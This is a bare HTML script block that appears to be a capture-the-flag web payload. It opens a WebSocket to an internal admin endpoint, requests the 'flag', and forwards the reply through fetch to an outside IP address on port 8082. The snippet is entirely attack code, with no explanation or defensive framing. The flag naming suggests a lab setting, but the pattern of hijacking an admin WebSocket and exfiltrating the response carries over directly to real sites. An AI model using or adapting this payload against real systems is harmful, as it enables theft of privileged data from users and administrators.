<script>
    const ws = new WebSocket("ws://web:8080/admin/ws");

    const interval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send("flag");
            clearInterval(interval);
        }
    }, 30);

    ws.onmessage = e => {
        fetch("http://93.118.159.87:8082/?flag=" + encodeURIComponent(e.data));
    };
</script>
